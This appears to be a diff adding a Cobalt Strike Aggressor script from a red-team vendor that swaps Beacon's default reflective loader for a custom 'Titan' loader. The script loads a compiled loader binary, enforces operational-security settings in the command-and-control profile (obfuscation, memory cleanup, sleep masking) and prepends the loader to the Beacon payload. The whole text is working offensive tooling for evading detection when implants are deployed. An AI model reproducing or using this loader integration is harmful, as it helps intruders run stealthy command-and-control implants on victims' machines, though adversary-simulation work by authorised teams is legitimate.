@@ -1,0 +1,62 @@
+##
+## Reflective Loader
+##
+## GuidePoint Security LLC
+##
+## Threat and Attack Simulation
+##
+
+import javax.crypto.spec.*;
+import java.security.*;
+import javax.crypto.*;
+
+##
+## Inserts titan into Beacon
+##
+set BEACON_RDLL_GENERATE {
+
+	##
+	## Open up titan.
+	##
+	$hnd = openf( script_resource( "Titan.". $3 .".bin" ) );
+	$ldr = readb( $hnd, -1 );
+	closef( $hnd );
+
+	if ( strlen( $ldr ) == 0 ) {
+		##
+		## Titan was not compiled.
+		##
+		warn( 'titan has not been compiled, using standard cobalt loader.' );
+		return $null;
+	};
+
+	$prf = data_query( "metadata" )["c2profile"];
+	if ( [ $prf getString: ".stage.sleep_mask" ] eq "true" ) {
+		if ( [ $prf getString: ".stage.obfuscate" ] eq "false" ) {
+			##
+			## We cannot use sleep_mask with Titan if obfuscate = False
+			##
+			warn( 'titan cannot be used with sleep_mask if obfuscate is set to false' );
+			return $null;
+		};
+	};
+	if ( [ $prf getString: ".stage.cleanup" ] eq "false" ) {
+		##
+		## Opsec error!
+		##
+		warn( 'titan cannot be used without cleaning up its memory. please enable in your profile.' );
+		return $null;
+	};
+
+	##
+	## Return Loader
+	##
+	return $ldr . $2;
+};
+
+##
+## Size
+##
+set BEACON_RDLL_SIZE {
+	return "0";
+};
